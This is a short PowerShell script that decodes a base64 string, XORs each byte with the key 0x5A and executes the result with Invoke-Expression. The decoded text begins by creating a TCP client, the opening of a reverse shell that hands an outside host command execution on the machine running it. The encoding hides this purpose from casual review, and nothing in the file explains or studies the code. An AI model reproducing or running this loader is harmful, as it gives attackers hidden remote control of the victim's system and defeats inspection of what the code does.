$key = 0x5A

$encodedScript = "fjk2Mz80LnpnehQ/LXcVODA/OS56CSMpLj83dBQ/LnQJNTkxPy4pdA4ZChk2Mz80LnJ4aGhpdGhvbnRramN0Ymx4dmNqamtzYVB+KS4oPzs3emd6fjk2Mz80LnQdPy4JLig/Ozdyc2FQATgjLj8BBwd+OCMuPyl6Z3pqdHRsb29pbyZ/IWonYVAtMjM2P3JyfjN6Z3p+KS4oPzs3dAg/Oz5yfjgjLj8pdnpqdnp+OCMuPyl0Fj80PS4yc3N6dzQ/empzIVB+PjsuO3pnenIUPy13FTgwPzkuencOIyo/FDs3P3oJIykuPzd0Dj8iLnQbCRkTEx80OTU+MzQ9c3QdPy4JLigzND1yfjgjLj8pdmp2en4zc2FQfik/ND44Ozkxemd6cjM/Inp+PjsuO3poZHxreiZ6FS8udwkuKDM0PXpzYVB+KT80Pjg7OTFoenpnen4pPzQ+ODs5MXpxengKCXp4enF6ciotPnN0CjsuMnpxenhkenhhUH4pPzQ+OCMuP3pnenIBLj8iLnQ/NDk1PjM0PQdgYBsJGRMTc3QdPy4YIy4/KXJ+KT80Pjg7OTFoc2FQfikuKD87N3QNKDMuP3J+KT80PjgjLj92anZ+KT80PjgjLj90Fj80PS4yc2FQfikuKD87N3QcNi8pMnJzJ2FQfjk2Mz80LnQZNjUpP3Jz"

$decodedBytes = [System.Convert]::FromBase64String($encodedScript)

for ($i = 0; $i -lt $decodedBytes.Length; $i++) {
    $decodedBytes[$i] = $decodedBytes[$i] -bxor $key
}

$decodedScript = [System.Text.Encoding]::ASCII.GetString($decodedBytes)

Invoke-Expression $decodedScript